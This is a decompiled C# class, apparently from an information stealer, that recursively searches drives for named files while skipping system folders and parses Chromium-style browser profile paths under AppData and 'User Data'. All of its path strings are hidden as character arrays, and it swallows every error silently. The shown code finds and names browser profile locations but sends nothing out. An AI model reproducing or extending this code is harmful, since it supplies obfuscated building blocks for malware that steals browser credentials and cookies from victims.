using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000031 RID: 49
public class FileCopier
{
	// Token: 0x0600010B RID: 267 RVA: 0x0000AC34 File Offset: 0x00009034
	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>();
		list.Add(new string(new char[]
		{
			'\\',
			'W',
			'i',
			'n',
			'd',
			'o',
			'w',
			's',
			'\\'
		}));
		list.Add(new string(new char[]
		{
			'\\',
			'P',
			'r',
			'o',
			'g',
			'r',
			'a',
			'm',
			' ',
			'F',
			'i',
			'l',
			'e',
			's',
			'\\'
		}));
		list.Add(new string(new char[]
		{
			'\\',
			'P',
			'r',
			'o',
			'g',
			'r',
			'a',
			'm',
			' ',
			'F',
			'i',
			'l',
			'e',
			's',
			' ',
			'(',
			'x',
			'8',
			'6',
			')',
			'\\'
		}));
		list.Add(new string(new char[]
		{
			'\\',
			'P',
			'r',
			'o',
			'g',
			'r',
			'a',
			'm',
			' ',
			'D',
			'a',
			't',
			'a',
			'\\'
		}));
		List<string> list2 = new List<string>();
		bool flag = files == null || files.Length == 0 || level > maxLevel;
		List<string> result;
		if (flag)
		{
			result = list2;
		}
		else
		{
			try
			{
				foreach (string text in Directory.GetDirectories(baseDirectory))
				{
					bool flag2 = false;
					foreach (string value in list)
					{
						bool flag3 = text.Contains(value);
						if (flag3)
						{
							flag2 = true;
							break;
						}
					}
					bool flag4 = flag2;
					if (!flag4)
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(text);
							FileInfo[] files2 = directoryInfo.GetFiles();
							bool flag5 = false;
							for (int j = 0; j < files2.Length; j++)
							{
								bool flag6 = flag5;
								if (flag6)
								{
									break;
								}
								for (int k = 0; k < files.Length; k++)
								{
									bool flag7 = flag5;
									if (flag7)
									{
										break;
									}
									string a = files[k];
									FileInfo fileInfo = files2[j];
									bool flag8 = a == fileInfo.Name;
									if (flag8)
									{
										flag5 = true;
										list2.Add(fileInfo.FullName);
									}
								}
							}
							foreach (string item in FileCopier.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
							{
								bool flag9 = !list2.Contains(item);
								if (flag9)
								{
									list2.Add(item);
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			result = list2;
		}
		return result;
	}

	// Token: 0x0600010C RID: 268 RVA: 0x0000AECC File Offset: 0x000092CC
	public static string ChromeGetName(string path)
	{
		try
		{
			string[] array = path.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			bool flag = array[array.Length - 2].Contains(new string(new char[]
			{
				'U',
				's',
				'e',
				'r',
				' ',
				'D',
				'a',
				't',
				'a'
			}));
			if (flag)
			{
				return array[array.Length - 1];
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	// Token: 0x0600010D RID: 269 RVA: 0x0000AF44 File Offset: 0x00009344
	public static string ChromeGetRoamingName(string path)
	{
		try
		{
			return path.Split(new string[]
			{
				new string(new char[]
				{
					'A',
					'p',
					'p',
					'D',
					'a',
					't',
					'a',
					'\\',
					'R',
					'o',
					'a',
					'm',
					'i',
					'n',
					'g',
					'\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries)[0];
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x0600010E RID: 270 RVA: 0x0000AFB0 File Offset: 0x000093B0
	public static string ChromeGetLocalName(string path)
	{
		try
		{
			string[] array = path.Split(new string[]
			{
				new string(new char[]
				{
					'A',
					'p',
					'p',
					'D',
					'a',
					't',
					'a',
					'\\',
					'L',
					'o',
					'c',
					'a',
					'l',
					'\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			return array[0] + "_[" + array[1] + "]";
		}
		catch
		{
		}
		return string.Empty;
	}
}
